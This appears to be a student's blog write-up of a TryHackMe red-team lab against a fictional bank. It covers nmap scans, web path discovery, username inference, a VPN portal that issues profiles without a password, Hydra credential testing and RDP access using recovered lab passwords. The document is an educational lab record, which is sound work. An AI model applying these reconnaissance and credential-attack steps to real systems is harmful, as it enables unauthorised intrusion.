---
title: "Red Team Capstone Challenge: A Partial Lab Write-up"
description: "My TryHackMe Red Team Capstone assessment for Certificate IV in Cyber Security, covering corporate access, Active Directory, and progress before the lab reset."
date: 2026-11-07 12:00:00 +1000
categories: [Cyber Security, Lab Walkthroughs]
tags: [tryhackme, red-team, active-directory, penetration-testing]
toc: true
---

<style>
.capstone-article { overflow-wrap: anywhere; }
.capstone-article figure { margin: 1.5rem 0; }
.capstone-article figure img { display: block; max-width: 100%; height: auto; margin: 0 auto; }
.capstone-article pre { max-width: 100%; overflow-x: auto; padding: 1rem; border-radius: .5rem; background: var(--highlight-bg-color, #f6f8fa); }
.capstone-article pre code { white-space: pre; overflow-wrap: normal; word-break: normal; font-size: .85rem; }
.capstone-article .pdf-source-section { margin: 0; padding: 0; }
.capstone-article ul { margin-bottom: 1rem; }
.capstone-article details { margin: 1rem 0; }
.capstone-article .table-wrapper { overflow-x: auto; }
.capstone-article table { width: 100%; min-width: 38rem; table-layout: fixed; }
.capstone-article table td, .capstone-article table th { white-space: normal !important; overflow-wrap: anywhere; vertical-align: top; }
.capstone-article table th:first-child { width: 22%; }
@media (max-width: 575px) { .capstone-article figure { width: 100% !important; } }
</style>

{% raw %}
<div class="capstone-article">
<!-- PDF page 1 -->
<section id="pdf-page-1" class="pdf-source-section" data-pdf-page="1" aria-label="Source page 1">
<p>By Bryce Mccorkell.</p>

<h2 id="welcome-to-trimento">Welcome to Trimento!</h2>

<p>Trimento is the fictional setting for the <a href="https://tryhackme.com/room/redteamcapstonechallenge">TryHackMe Red Team Capstone Challenge</a>. Its government has asked a security consultancy to assess TheReserve, a simulated reserve bank.</p>

<p>The engagement covers two divisions: <strong>Corporate</strong>, which manages foreign investments and corporate clients, and <strong>Bank</strong>, which operates the core banking environment.</p>

<p>The central question is whether weaknesses in the corporate environment could provide a route into the banking environment.</p>

<p>My approach was to enumerate the exposed hosts, obtain corporate access, and investigate the relationships between the Windows domains.</p>

<p>The final objective concerned the lab's simulated SWIFT application. In the real world, <a href="https://www.swift.com/about-us/who-we-are">Swift carries financial messages and payment instructions</a>; the participating institutions move the funds.</p>

<p>I worked through this lab in August 2026 as part of an assessment for my Certificate IV in Cyber Security. This write-up documents the practical work I carried out for that assessment, using the addresses and tool versions shown in the screenshots.</p>

<h3 id="outcome">Outcome</h3>
<p>I recorded evidence for 16 flags, progressing from external reconnaissance and corporate entry to local administrative access, then using existing domain privileges to reach the root and BANK domains.</p>

<p>This was a partial completion of the room: I did not complete the SWIFT transfer, and I did not establish how Laura's account obtained its corporate Domain Admin privileges. I explain both points alongside the relevant stages below.</p>

<h2 id="in-scope">In-Scope</h2>

<ul><li>Testing TheReserve hosts within the assigned lab range, subject to the exclusions below. Reachability through a VPN is not, by itself, authorisation.</li></ul>
</section>

<!-- PDF page 2 -->
<section id="pdf-page-2" class="pdf-source-section" data-pdf-page="2" aria-label="Source page 2">
<ul><li>Reconnaissance of TheReserve's website inside the supplied subnet; no external internet OSINT was part of the engagement.</li><li>Phishing of any of the employees of TheReserve.</li><li>Attacking the mailboxes of TheReserve employees on the WebMail host (.11).</li><li>Working towards the simulated transfer objective within the stated scope and exclusions.</li></ul>

<h2 id="out-of-scope">Out-of-Scope</h2>

<ul><li>Security testing of any sites not hosted on the network.</li><li>Security testing of the TryHackMe VPN (.250) and scoring servers, or attempts to attack any other user connected to the network.</li><li>Any security testing on the WebMail server (.11) that alters the mail server configuration or its underlying infrastructure.</li><li>Attacking the mailboxes of other red teamers on the WebMail portal (.11).</li><li>External (internet) OSINT gathering.</li><li>Testing hosts outside the subnet assigned by the room. For this attempt that range was 10.200.40.0/24; it must not be assumed for another deployment.</li><li>Conducting denial-of-service attacks or any attack that renders the network inoperable for other users.</li></ul>

<h2 id="registration">Registration:</h2>

<p>I registered through the lab's e-Citizen portal, which provided the engagement contact channel and flag-submission workflow.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-02-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-02-figure-01.png" alt="e-Citizen registration portal" width="1016" height="252" loading="lazy"></a></figure>

<p>Lab username: <code>n0debranch</code><br>Assigned target range: <code>10.200.40.0/24</code><br>I used the email account issued by the e-Citizen portal for engagement communication and flag submissions.</p>
</section>

<!-- PDF page 3 -->
<section id="pdf-page-3" class="pdf-source-section" data-pdf-page="3" aria-label="Source page 3">
<p>The supplied archive included tools, a base password list, and the company password policy. The brief narrowed the special characters to <code>!@#$%^</code>, making it possible to generate a bounded set of candidates for this lab.</p>



<figure style="width: 65.63%"><a href="/assets/img/posts/red-team-capstone/page-03-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-03-figure-01.png" alt="Supplied archive contents" width="668" height="530" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-03-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-03-figure-02.png" alt="Company password policy" width="1016" height="460" loading="lazy"></a></figure>

<p>With the scope and supplied resources established, I began enumeration.</p>
</section>

<!-- PDF page 4 -->
<section id="pdf-page-4" class="pdf-source-section" data-pdf-page="4" aria-label="Source page 4">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-04-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-04-figure-01.png" alt="Enumeration setup" width="1016" height="426" loading="lazy"></a></figure>

<h2 id="starting-layout">Starting Layout:</h2>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-04-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-04-figure-02.png" alt="Starting network layout" width="1016" height="686" loading="lazy"></a></figure>

<p>I started by mapping the exposed hosts and their services.</p>

<p>I initially scanned the whole assigned /24, which also included the excluded VPN address. I should have excluded that address from discovery. My subsequent service scan targeted only .11, .12, and .13.</p>

<p><code>-sn</code> performs host discovery without a port scan; it is not limited to ICMP echo requests. See the <a href="https://nmap.org/book/man-host-discovery.html">Nmap host-discovery documentation</a>.</p>
</section>

<!-- PDF page 5 -->
<section id="pdf-page-5" class="pdf-source-section" data-pdf-page="5" aria-label="Source page 5">
<pre><code>┌──(n0debranch㉿n0debranch)-[~]
└─$ nmap -sn 10.200.40.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 13:04 +1000
Nmap scan report for 10.200.40.1
Host is up (0.28s latency).
Nmap scan report for 10.200.40.11
Host is up (0.39s latency).
Nmap scan report for 10.200.40.12
Host is up (0.34s latency).
Nmap scan report for 10.200.40.13
Host is up (0.18s latency).
Nmap scan report for 10.200.40.250
Host is up (0.28s latency).
Nmap done: 256 IP addresses (5 hosts up) scanned in 20.84 seconds</code></pre>

<p>The sweep also returned .1 and .250. I suspected .1 was a gateway, but did not verify its role. The brief identified .250 as excluded TryHackMe VPN infrastructure, so I did not include either address in the service scan below.</p>

<p><code>-sC</code> runs Nmap's default NSE scripts; <code>-sV</code> probes for service versions. These results describe the scanned ports, not an exhaustive inventory of every TCP and UDP service.</p>

<pre><code>┌──(n0debranch㉿n0debranch)-[~]
└─$ nmap -sC -sV 10.200.40.11 10.200.40.12 10.200.40.13
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-09 13:54 +1000
Nmap scan report for 10.200.40.11
Host is up (0.32s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 f3:6c:52:d2:7f:e9:0e:1c:c1:c7:ac:96:2c:d1:ec:2d (RSA)
|   256 c2:56:3c:ed:c4:b0:69:a8:e7:ad:3c:31:05:05:e9:85 (ECDSA)
|_  256 d3:e5:f0:73:75:d5:20:d9:c0:bb:41:99:e7:af:a0:00 (ED25519)
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP USER UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</code></pre>
</section>

<!-- PDF page 6 -->
<section id="pdf-page-6" class="pdf-source-section" data-pdf-page="6" aria-label="Source page 6">
<pre><code>143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: IMAP4 CHILDREN NAMESPACE IDLE completed CAPABILITY OK
RIGHTS=texkA0001 SORT ACL QUOTA IMAP4rev1
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 8.0.31
| ssl-cert: Subject:
commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
| Not valid before: 2023-01-10T07:46:11
|_Not valid after:  2033-01-07T07:46:11
| mysql-info:
|   Protocol: 10
|   Version: 8.0.31
|   Thread ID: 21
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, LongPassword, Support41Auth,
InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn,
SupportsTransactions, IgnoreSigpipes, SwitchToSSLAfterHandshake,
ConnectWithDatabase, Speaks41ProtocolOld, FoundRows,
IgnoreSpaceBeforeParenthesis, ODBCClient, LongColumnFlag,
SupportsCompression, SupportsMultipleStatments, SupportsAuthPlugins,
SupportsMultipleResults
|   Status: Autocommit
|   Salt: qlYk\x1F8T'sHK?x\x1E1\x19     M77
|_  Auth Plugin Name: caching_sha2_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-09T03:56:11+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THERESERVE
|   NetBIOS_Domain_Name: THERESERVE
|   NetBIOS_Computer_Name: MAIL
|   DNS_Domain_Name: thereserve.loc
|   DNS_Computer_Name: MAIL.thereserve.loc
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-09T03:55:57+00:00
| ssl-cert: Subject: commonName=MAIL.thereserve.loc
| Not valid before: 2026-08-05T07:11:53
|_Not valid after:  2027-02-04T07:11:53
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre>
</section>

<!-- PDF page 7 -->
<section id="pdf-page-7" class="pdf-source-section" data-pdf-page="7" aria-label="Source page 7">
<pre><code>Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-08-09T03:56:00
|_  start_date: N/A</code></pre>

<pre><code>Nmap scan report for 10.200.40.12
Host is up (0.42s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol
2.0)
| ssh-hostkey:
|   2048 10:d3:bd:2c:ec:db:33:94:59:fe:31:9e:d7:c7:8c:13 (RSA)
|   256 be:71:c7:af:dc:fb:65:4c:f7:63:1f:3a:5f:3a:16:01 (ECDSA)
|_  256 41:98:77:69:3a:69:52:44:c8:02:a2:84:fe:49:f8:2c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: VPN Request Portal
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>

<pre><code>Nmap scan report for 10.200.40.13
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol
2.0)
| ssh-hostkey:
|   2048 4f:c6:ea:a6:b1:ed:2a:1c:53:c0:90:bf:d5:44:db:69 (RSA)
|   256 da:bc:8b:d4:d0:3a:61:a2:5d:33:39:12:e8:be:a0:13 (ECDSA)
|_  256 23:04:b5:fe:77:04:cb:a8:26:39:dc:b3:09:d3:4d:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>

<p>The results gave me three useful starting points: the mail server, VPN request portal, and corporate website.</p>
</section>

<!-- PDF page 8 -->
<section id="pdf-page-8" class="pdf-source-section" data-pdf-page="8" aria-label="Source page 8">
<figure style="width: 36.58%"><a href="/assets/img/posts/red-team-capstone/page-08-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-08-figure-01.png" alt="Scan overview" width="372" height="406" loading="lazy"></a></figure>

<h2 id="10-200-40-11-mail-server"><strong>10.200.40.11 - Mail server</strong></h2>

<ul><li>22/tcp — SSH — OpenSSH for Windows 7.7</li><li>25/tcp — SMTP — hMailServer smtpd</li><li>80/tcp — HTTP — Microsoft IIS 10.0</li><li>110/tcp — POP3 — hMailServer pop3d</li><li>135/tcp — MSRPC — Microsoft Windows RPC</li><li>139/tcp — NetBIOS-SSN — Microsoft Windows NetBIOS</li><li>143/tcp — IMAP — hMailServer imapd</li><li>445/tcp — Microsoft-DS — SMB</li><li>587/tcp — SMTP — hMailServer smtpd</li><li>3306/tcp — MySQL — MySQL 8.0.31</li><li>3389/tcp — RDP — Microsoft Terminal Services</li><li>5985/tcp — HTTP — Microsoft HTTPAPI 2.0</li></ul>

<p>Additional information reported by the scan:</p>

<pre><code>Hostname: MAIL</code></pre>

<pre><code>Domain: thereserve.loc</code></pre>

<pre><code>NetBIOS domain: THERESERVE</code></pre>

<pre><code>FQDN: MAIL.thereserve.loc</code></pre>

<pre><code>Windows product version: 10.0.17763</code></pre>

<ul><li>SMB signing: enabled, not required</li></ul>

<h2 id="10-200-40-12-vpn-request-portal"><strong>10.200.40.12 - VPN Request Portal</strong></h2>

<ul><li>22/tcp — SSH — OpenSSH 7.6p1 Ubuntu</li><li>80/tcp — HTTP — Apache 2.4.29</li></ul>
</section>

<!-- PDF page 9 -->
<section id="pdf-page-9" class="pdf-source-section" data-pdf-page="9" aria-label="Source page 9">
<h2 id="web-enumeration">Web enumeration</h2>
<pre><code>HTTP title: VPN Request Portal</code></pre>

<ul><li>OS: Ubuntu Linux</li></ul>

<h2 id="10-200-40-13-apache-web-server"><strong>10.200.40.13 - Apache Web Server</strong></h2>

<ul><li>22/tcp — SSH — OpenSSH 7.6p1 Ubuntu</li><li>80/tcp — HTTP — Apache 2.4.29</li><li>HTTP title: none</li><li>OS: Ubuntu Linux</li></ul>

<p>I used Gobuster with <code>common.txt</code> to look for web paths on the three exposed hosts. A discovered path is not automatically a vulnerability, and a negative result only describes the paths and responses covered by that scan.</p>

<p>The scan of .11 returned no useful matches with this wordlist.</p>

<p>On .12, the scan identified <code>/vpn</code>, which I returned to after reviewing the corporate website.</p>

<figure style="width: 94.25%"><a href="/assets/img/posts/red-team-capstone/page-09-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-09-figure-01.png" alt="Gobuster results for 10.200.40.12" width="958" height="596" loading="lazy"></a></figure>
</section>

<!-- PDF page 10 -->
<section id="pdf-page-10" class="pdf-source-section" data-pdf-page="10" aria-label="Source page 10">
<p>Gobuster results for 10.200.40.13:</p>

<figure style="width: 86.87%"><a href="/assets/img/posts/red-team-capstone/page-10-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-10-figure-01.png" alt="Gobuster results for 10.200.40.13" width="884" height="594" loading="lazy"></a></figure>

<p>I reviewed .13 first, then returned to the VPN portal.</p>

<p>The host served TheReserve's corporate website.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-10-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-10-figure-02.png" alt="Corporate website" width="1016" height="706" loading="lazy"></a></figure>
</section>

<!-- PDF page 11 -->
<section id="pdf-page-11" class="pdf-source-section" data-pdf-page="11" aria-label="Source page 11">
<p>The staff page exposed names, roles, and photographs that could help establish likely account names. This was reconnaissance within the supplied lab network.</p>

<figure style="width: 52.51%"><a href="/assets/img/posts/red-team-capstone/page-11-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-11-figure-01.png" alt="Staff page" width="534" height="1206" loading="lazy"></a></figure>
</section>

<!-- PDF page 12 -->
<section id="pdf-page-12" class="pdf-source-section" data-pdf-page="12" aria-label="Source page 12">
<figure style="width: 51.47%"><a href="/assets/img/posts/red-team-capstone/page-12-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-12-figure-01.png" alt="Staff page detail" width="524" height="392" loading="lazy"></a></figure>

<p>The image filenames contained first and last names that were not all visible on the page.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-12-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-12-figure-02.png" alt="Image filenames" width="1016" height="86" loading="lazy"></a></figure>

<p>The parent image directory allowed directory listing, exposing additional filenames.</p>
</section>

<!-- PDF page 13 -->
<section id="pdf-page-13" class="pdf-source-section" data-pdf-page="13" aria-label="Source page 13">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-13-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-13-figure-01.png" alt="Directory listing" width="1016" height="832" loading="lazy"></a></figure>

<p>The site also had a Contact Us page and a simple to-do-list feature.</p>

<p>The contact address was <code>applications@corp.thereserve.loc</code>. This provided a candidate domain for later authentication tests.</p>
</section>

<!-- PDF page 14 -->
<section id="pdf-page-14" class="pdf-source-section" data-pdf-page="14" aria-label="Source page 14">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-14-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-14-figure-01.png" alt="Contact page" width="1016" height="590" loading="lazy"></a></figure>

<p>I investigated the page's input handling, but did not establish a server-side exploit or another useful route from that feature.</p>

<p>The useful results from this host were the staff names and the corporate domain.</p>

<p>I then moved to the VPN request portal on 10.200.40.12.</p>
</section>

<!-- PDF page 15 -->
<section id="pdf-page-15" class="pdf-source-section" data-pdf-page="15" aria-label="Source page 15">
<h2 id="vpn-portal">VPN portal and exposed profiles</h2>
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-01.png" alt="VPN request portal" width="1016" height="808" loading="lazy"></a></figure>

<p>The portal presented a username and password form.</p>

<p>I considered the supplied password list, but first checked what the login responses revealed about usernames.</p>

<p>I tried formats such as <code>roy_sims</code> and <code>roy.sims</code>. The responses did not distinguish them, so this test did not establish a valid username format.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-15-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-15-figure-02.png" alt="Login response testing" width="1016" height="110" loading="lazy"></a></figure>

<p>The image filenames suggested <code>firstname.lastname</code>, and the contact page suggested <code>corp.thereserve.loc</code>. I used these observations to form a hypothesis, rather than treating the format as confirmed.</p>
</section>

<!-- PDF page 16 -->
<section id="pdf-page-16" class="pdf-source-section" data-pdf-page="16" aria-label="Source page 16">
<p>While entering an email address, I submitted the form before entering a password. The portal allowed me to proceed. This demonstrated a missing-password check in the workflow I tested; it did not establish that every possible user could authenticate.</p>

<figure style="width: 54.28%"><a href="/assets/img/posts/red-team-capstone/page-16-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-16-figure-01.png" alt="Missing-password check" width="552" height="536" loading="lazy"></a></figure>

<p>The configuration-generation form also accepted the values I tested, including arbitrary input. Reaching this page was not yet proof of an established VPN connection. I needed to test the resulting profile separately.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-16-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-16-figure-02.png" alt="Configuration-generation form" width="1016" height="558" loading="lazy"></a></figure>
</section>

<!-- PDF page 17 -->
<section id="pdf-page-17" class="pdf-source-section" data-pdf-page="17" aria-label="Source page 17">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-17-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-17-figure-01.png" alt="Generated profile" width="1016" height="488" loading="lazy"></a></figure>

<p>The portal generated an OpenVPN profile for the submitted identity.</p>

<p>The profile contained an unencrypted private key. That alone does not prove a VPN vulnerability; the problem here was that usable client material appeared obtainable without adequate authentication or authorisation.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-17-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-17-figure-02.png" alt="OpenVPN profile contents" width="1016" height="672" loading="lazy"></a></figure>
</section>

<!-- PDF page 18 -->
<section id="pdf-page-18" class="pdf-source-section" data-pdf-page="18" aria-label="Source page 18">
<p>The earlier directory scan had also found <code>/vpn</code> on this host.</p>

<figure style="width: 94.84%"><a href="/assets/img/posts/red-team-capstone/page-18-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-18-figure-01.png" alt="/vpn directory listing" width="964" height="428" loading="lazy"></a></figure>

<p>The listing exposed another <code>.ovpn</code> profile containing a client certificate, its private key, and a <code>tls-auth</code> shared key. The certificate named a CA; the configuration file itself was not a CA-signed document. Whether those credentials were accepted still depended on the server.</p>

<ul><li>Client certificate naming the CA <code>ChangeMe</code></li><li>Unencrypted client private key</li><li>tls-auth key</li></ul>

<p>Before testing the profile, I returned to the supplied password list to look for corporate credentials.</p>

<figure style="width: 75.52%"><a href="/assets/img/posts/red-team-capstone/page-18-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-18-figure-02.png" alt="Exposed .ovpn profile" width="768" height="570" loading="lazy"></a></figure>
</section>

<!-- PDF page 19 -->
<section id="pdf-page-19" class="pdf-source-section" data-pdf-page="19" aria-label="Source page 19">
<h2 id="credential-testing">Corporate credential testing</h2>
<p>I used a short Python script to generate password candidates from the supplied list and permitted special characters.</p>

<figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-01.png" alt="Password candidate generation" width="824" height="378" loading="lazy"></a></figure>

<p>I built a username list using <code>firstname.lastname</code> and the candidate email domain <code>corp.thereserve.loc</code>. These were still assumptions until a service accepted them.</p>

<p>The mail host at 10.200.40.11 exposed SMTP authentication, providing a way to test these lab accounts.</p>

<p>I used Hydra for a dictionary-based credential test with the generated candidates.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-19-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-19-figure-02.png" alt="Hydra credential test" width="1016" height="352" loading="lazy"></a></figure>

<p>The output reported successful credentials for Laura Wood and Mohammad Ahmed, both listed as corporate customer investment managers.</p>

<p>Lab account: <code>laura.wood@corp.thereserve.loc</code> — password: <code>Password1@</code><br>Lab account: <code>mohammad.ahmed@corp.thereserve.loc</code> — password: <code>Password1!</code></p>

<p>I then checked the corresponding mailboxes for further clues.</p>
</section>

<!-- PDF page 20 -->
<section id="pdf-page-20" class="pdf-source-section" data-pdf-page="20" aria-label="Source page 20">
<p>Laura's mailbox check:</p>

<figure style="width: 46.31%"><a href="/assets/img/posts/red-team-capstone/page-20-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-20-figure-01.png" alt="Laura&#x27;s mailbox" width="472" height="364" loading="lazy"></a></figure>

<p>Mohammad's mailbox check:</p>

<figure style="width: 49.71%"><a href="/assets/img/posts/red-team-capstone/page-20-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-20-figure-02.png" alt="Mohammad&#x27;s mailbox" width="506" height="372" loading="lazy"></a></figure>

<p>Neither mailbox returned messages in these checks. I retained the credentials for subsequent host-access tests.</p>

<figure style="width: 49.26%"><a href="/assets/img/posts/red-team-capstone/page-20-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-20-figure-03.png" alt="Credential retention" width="500" height="500" loading="lazy"></a></figure>

<p>Next, I tested the exposed OpenVPN profile.</p>
</section>

<!-- PDF page 21 -->
<section id="pdf-page-21" class="pdf-source-section" data-pdf-page="21" aria-label="Source page 21">
<h2 id="corporate-vpn">Connecting to the corporate VPN</h2>
<p>I downloaded the lab profile from <code>http://10.200.40.12/vpn/corpUsername.ovpn</code>. This is an internal lab address, not a public download link.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-01.png" alt="Downloading the profile" width="1016" height="218" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-02.png" alt="Profile contents" width="1016" height="536" loading="lazy"></a></figure>

<p>The profile's <code>remote</code> entry still contained the placeholder <code>10.200.X.X</code>. I replaced the endpoint with 10.200.40.12 while retaining the profile's port and protocol, then reconnected. The logs below record the connection attempt. This change selected the VPN endpoint; it did not change the assigned target scope.</p>

<figure style="width: 40.71%"><a href="/assets/img/posts/red-team-capstone/page-21-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-21-figure-03.png" alt="Editing the remote entry" width="414" height="274" loading="lazy"></a></figure>
</section>

<!-- PDF page 22 -->
<section id="pdf-page-22" class="pdf-source-section" data-pdf-page="22" aria-label="Source page 22">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-22-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-22-figure-01.png" alt="Connection attempt" width="1016" height="954" loading="lazy"></a></figure>

<p>OpenVPN created a second tunnel interface, <code>tun1</code>. The resulting routing output showed paths to the corporate workstations.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-22-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-22-figure-02.png" alt="Routing output" width="1016" height="184" loading="lazy"></a></figure>

<p>The relevant target routes were 10.200.40.21 and 10.200.40.22. Addresses in <code>12.100.1.x</code> belonged to the VPN tunnel, not a new target subnet. My Kali tunnel address changed between connections, so I needed to check it before transferring files. The <a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN manual</a> explains tunnel addressing, routes, and the remote endpoint.</p>
</section>

<!-- PDF page 23 -->
<section id="pdf-page-23" class="pdf-source-section" data-pdf-page="23" aria-label="Source page 23">
<p>The initial host-discovery probes did not receive a response from .21. The screenshot records a scan with <code>-Pn</code>, which skips that discovery gate; a missing ping response does not establish that a host is down.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-23-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-23-figure-01.png" alt="Scan of .21" width="1016" height="1014" loading="lazy"></a></figure>
</section>

<!-- PDF page 24 -->
<section id="pdf-page-24" class="pdf-source-section" data-pdf-page="24" aria-label="Source page 24">
<p>Scan results for 10.200.40.22:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-24-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-24-figure-01.png" alt="Scan results for 10.200.40.22" width="1016" height="934" loading="lazy"></a></figure>

<p>Two findings stood out:</p>

<ul><li><strong>RDP</strong> (3389) - Allows us the ability to connect via a Remote Desktop session.</li><li><strong>SMB signing:</strong> the scan reported signing enabled but not required. This permits unsigned sessions under some conditions and can matter for relay attacks. Signing provides integrity and authenticity; encryption provides confidentiality. The scan does not establish that every session was unsigned or that all traffic was plaintext. See <a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview">Microsoft's SMB signing overview</a>.</li></ul>
</section>

<!-- PDF page 25 -->
<section id="pdf-page-25" class="pdf-source-section" data-pdf-page="25" aria-label="Source page 25">
<h2 id="workstation-access">Workstation access and flag submission</h2>
<figure style="width: 74.78%"><a href="/assets/img/posts/red-team-capstone/page-25-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-25-figure-01.png" alt="Workstation access" width="760" height="570" loading="lazy"></a></figure>

<p>I tested Laura's corporate credentials over RDP against WRK1 at 10.200.40.21.</p>

<p>The session opened successfully. This demonstrated interactive access to that workstation, not Domain Admin control.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-25-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-25-figure-02.png" alt="RDP session to WRK1" width="1016" height="646" loading="lazy"></a></figure>
</section>

<!-- PDF page 26 -->
<section id="pdf-page-26" class="pdf-source-section" data-pdf-page="26" aria-label="Source page 26">
<p>I initially looked for a flag file on the workstation, then realised the room used e-Citizen to validate evidence.</p>

<p>For the first flag, I supplied the hostname WRK1 and wrote the portal-issued UID to <code>C:\Windows\Temp\n0debranch.txt</code>. The portal checked the evidence and emailed the flag. The UID shown below is a placeholder; each submission must use the value and location requested by the portal.</p>

<p>I followed the portal's individual instructions for flags 2 and 3 as well. At this point, I still had the Active Directory environment to work through.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-26-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-26-figure-01.png" alt="Flag submission workflow" width="1016" height="520" loading="lazy"></a></figure>

<pre><code>echo XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX &gt; C:\Windows\Temp\n0debranch.txt</code></pre>
</section>

<!-- PDF page 27 -->
<section id="pdf-page-27" class="pdf-source-section" data-pdf-page="27" aria-label="Source page 27">
